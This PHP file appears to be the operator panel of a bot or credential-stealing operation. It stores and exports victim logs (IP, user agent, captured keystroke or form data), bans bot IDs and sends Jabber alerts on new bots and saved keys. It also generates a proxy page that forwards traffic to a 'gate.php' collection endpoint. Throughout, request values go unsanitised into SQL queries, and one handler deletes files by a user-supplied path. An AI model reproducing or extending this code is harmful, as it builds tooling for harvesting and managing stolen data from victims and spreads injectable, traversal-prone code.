<?php
if (!defined('UADMIN_AB_ROOT')) {die("You not have permisions");}

$sql = new sqlite3($k_plugin->path . 'public/.htBd.db');

//### logs init  ###########################
require_once $k_plugin->path . '/classes/class-logs.php';
LOG_::init();

//### logs init  ###########################

if (isset($_GET['text'])) {

    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="report.txt"');
    $items    = 0;
    $text_arr = json_decode($_GET['data']);
    $qstr     = "select * from main where rowid in ( ";
    foreach ($text_arr as $num) {

        $qstr .= $num . ",";
        $items++;
    }
    ;
    $qstr = preg_replace('/,$/', '', $qstr);
    $qstr .= ')';
    $res = $sql->query($qstr);
    $out = '';
    while ($r = $res->fetchArray()) {
        $out .= "| " . $r['lc'] . " | " . $r['link'] . " | " . $r['ua'] . " | " . $r['ip'] . " |\n  ";
        $log = preg_replace("/\<br\>/", "\n  ", $r['log']);
        $out .= $log . "\n\n";
    }
    ;
    print($out);

    exit;
}

if (isset($_GET['savebannedbids'])) {
    $respond = json_decode('{"connect":"OK"}');
    header("Content-type: text/javascript");
    $bids = ($_GET['bids']);
    $res  = $sql->exec("update bloked set bids='$bids'");
    echo json_encode($respond);
    exit;
}

if (isset($_GET['proxy'])) {

    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename="home.php"');

    $proxy_content = file_get_contents(dirname(__file__) . '/proxy_template/proxy.php');

    $proxy_content = str_replace("{{real_home}}", UADMIN_ROOT_DIR_URL . "gate.php", $proxy_content);

    $out = $proxy_content;
    print($out);

    exit;
}

if (isset($_GET['del'])) {

    ACTION::actions_filter(json_decode('{"id":"log_del","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Delete logs on Log Plugin"}'));

    $items   = 0;
    $del_arr = json_decode($_GET['data']);
    $qstr    = "delete from main where rowid in ( ";
    foreach ($del_arr as $num) {
        $qstr .= $num . ",";
        $items++;
    }
    ;
    $qstr = preg_replace('/,$/', '', $qstr);
    $qstr .= ')';
    $res = $sql->exec($qstr);
    if (!$res) {echo "err";} else {echo $items . " " . __('item(s) Deleted') . "";}

    $sql->exec("vacuum");
    exit;
}

if (isset($_GET['del_all'])) {

    ACTION::actions_filter(json_decode('{"id":"log_del","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Delete logs on Log Plugin"}'));
    $items = "ALL";
    $res   = $sql->exec("delete from main where 1=1");

    if (!$res) {echo "err";} else {echo $items . " " . __('item(s) Deleted') . "";}

    $sql->exec("vacuum");
    exit;
}
;

if (isset($_GET['comm'])) {

    ACTION::actions_filter(json_decode('{"id":"log_edit_comm","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Edit comments on Log Plugin"}'));

    $ui      = $_GET['ui'];
    $comm    = trim($_GET['comm']);
    $respond = json_decode('{}');
    header("Content-type: text/javascript");

    $res = $sql->exec("update main set comm='$comm' where rowid='$ui'");
    if ($res) {
        $respond->mes = "Updated";
    } else {
        $respond->mes = "err on sql udate";
    }

    echo json_encode($respond);
    exit;
}
;

//########## JABER #######
//########## JABER #######

if (isset($_POST['jabber_id'])) {

    ACTION::actions_filter(json_decode('{"id":"log_edit_jabb","err_mes":"Sorry, you can not perfome this operation. Contact admin","desc":"Edit Jabber data on Log Plugin"}'));

    $jab_obj = new stdClass();

    $jab_obj->from_id   = esc__($_POST['jabber_id']);
    $jab_obj->from_pass = esc__($_POST['jabber_pass']);
    $jab_obj->from_dom  = esc__($_POST['jabber_dom']);
    $jab_obj->to        = esc__($_POST['your_jabber']);
    $jab                = json_encode($jab_obj);

    $res = $sql->exec("update sys set jab='$jab'");

    $send_on             = new stdClass();
    $send_on->new_bot    = isset($_POST['new_bot']) ? 1 : 0;
    $send_on->keys_saved = isset($_POST['keys_saved']) ? 1 : 0;
    $send_on             = json_encode($send_on);
    $res                 = $sql->exec("update sys set send_on='$send_on'");

    if (!$res) {
        echo "error on save jabber";
        exit;
    }

}
;

if (isset($_GET['testjabber'])) {
    header("Content-type: text/javascript");
    $respond = new stdClass();
    $res     = $sql->query("select * from sys");
    $res     = $res->fetchArray();

    $jab = json_decode($res['jab']);
    require_once 'classes/class.jabber.php';
    send_jabber('Test');
    $respond->mes = __("Test jabber sent");
    echo json_encode($respond);
    exit;

}

//#########################################

if (isset($_GET['image_remove'])) {
    header("Content-type: text/json");
    $respond = new stdClass();

    $image_path = $_GET['id'];

    unlink(__DIR__ . '/' . $image_path) or die("Couldn't delete file");

    $respond->mes = "Removed";
    echo json_encode($respond);
    exit;
}

if (isset($_GET['export'])) {

    $data = json_decode($_GET['data']);

    $ids     = join("','", $data->ids);
    $columns = join(",", $data->columns);

    $res = $sql->query("select $columns from main where rowid in('$ids')");

    $exports = [];

    while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
        $exports[] = $row;
    }

    $OUT = "";

    if ($data->type == "txt") {

        header('Content-type: text/plain');
        header('Content-Disposition: attachment; filename="report.txt"');

        foreach ($exports as $export_row) {

            foreach ($export_row as $export_row_key => $export_row_value) {
                 if($export_row_key==""){continue;}
                if ($export_row_key == "log") {

                    $arr = (explode("\n", $export_row_value));

                    foreach ($arr as $arr2) {
                        $arr3 = explode("=", $arr2);
                        if($arr3[0]==""){continue;}
                        $OUT .= "| " . $arr3[0] . "=" . @$arr3[1];

                    }

                    continue;

                }
                $OUT .= "| " . $export_row_key . "=" . $export_row_value;
            }

            $OUT .= "\n\n";

        }

    } elseif ($data->type == "json") {
        header('Content-type: application/json');
        header('Content-Disposition: attachment; filename="report.json"');
        
        foreach ($exports as &$export_row) {

            foreach ($export_row as $export_row_key => $export_row_value) {
                if($export_row_key==""){continue;}
                if ($export_row_key == "log") {

                    $arr = (explode("\n", $export_row_value));
                    // $extented=new stdClass();
                    $extented=Array();


                    foreach ($arr as $arr2) {
                        $arr3 = explode("=", $arr2);

                        if($arr3[0]==""){continue;}

                        $extented[@$arr3[0]]=@$arr3[1];


                    }

                    unset($export_row['log']); 
                    $export_row=array_merge($export_row,$extented);

                }
            }

        }

        $OUT=json_encode($exports);
    }

    print($OUT);
    
    exit;
    
}
